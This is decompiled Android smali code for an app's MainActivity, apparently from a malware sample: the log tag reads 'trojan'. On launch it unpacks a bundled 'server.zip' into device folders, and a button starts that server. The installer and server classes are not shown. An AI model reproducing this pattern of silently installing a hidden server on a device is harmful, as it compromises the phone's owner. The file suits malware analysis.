.class public Lcom/systemb/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# static fields
.field private static TAG:Ljava/lang/String;


# instance fields
.field private docFolder:Ljava/lang/String;

.field private installator:Lcom/systemb/Installer;

.field private pathToInstallServer:Ljava/lang/String;

.field private utils:Lcom/systemb/ServerUtils;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 11
    const-string v0, "trojan"

    sput-object v0, Lcom/systemb/MainActivity;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 9
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public btn(Landroid/view/View;)V
    .locals 1

    .prologue
    .line 32
    iget-object v0, p0, Lcom/systemb/MainActivity;->utils:Lcom/systemb/ServerUtils;

    invoke-virtual {v0}, Lcom/systemb/ServerUtils;->runSrv()V

    .line 33
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 5

    .prologue
    const/4 v4, 0x1

    .line 19
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 20
    const/high16 v0, 0x7f030000

    invoke-virtual {p0, v0}, Lcom/systemb/MainActivity;->setContentView(I)V

    .line 23
    new-instance v0, Lcom/systemb/ServerUtils;

    invoke-direct {v0, p0}, Lcom/systemb/ServerUtils;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/systemb/MainActivity;->utils:Lcom/systemb/ServerUtils;

    .line 24
    new-instance v0, Lcom/systemb/Installer;

    invoke-direct {v0, p0, v4}, Lcom/systemb/Installer;-><init>(Landroid/content/Context;Z)V

    iput-object v0, p0, Lcom/systemb/MainActivity;->installator:Lcom/systemb/Installer;

    .line 26
    iget-object v0, p0, Lcom/systemb/MainActivity;->utils:Lcom/systemb/ServerUtils;

    invoke-virtual {v0}, Lcom/systemb/ServerUtils;->getPathToInstallServer()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/systemb/MainActivity;->pathToInstallServer:Ljava/lang/String;

    .line 27
    iget-object v0, p0, Lcom/systemb/MainActivity;->utils:Lcom/systemb/ServerUtils;

    invoke-virtual {v0}, Lcom/systemb/ServerUtils;->getDocFolder()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/systemb/MainActivity;->docFolder:Ljava/lang/String;

    .line 28
    iget-object v0, p0, Lcom/systemb/MainActivity;->installator:Lcom/systemb/Installer;

    const/4 v1, 0x3

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "server.zip"

    aput-object v3, v1, v2

    iget-object v2, p0, Lcom/systemb/MainActivity;->pathToInstallServer:Ljava/lang/String;

    aput-object v2, v1, v4

    const/4 v2, 0x2

    iget-object v3, p0, Lcom/systemb/MainActivity;->docFolder:Ljava/lang/String;

    aput-object v3, v1, v2

    invoke-virtual {v0, v1}, Lcom/systemb/Installer;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 29
    return-void
.end method
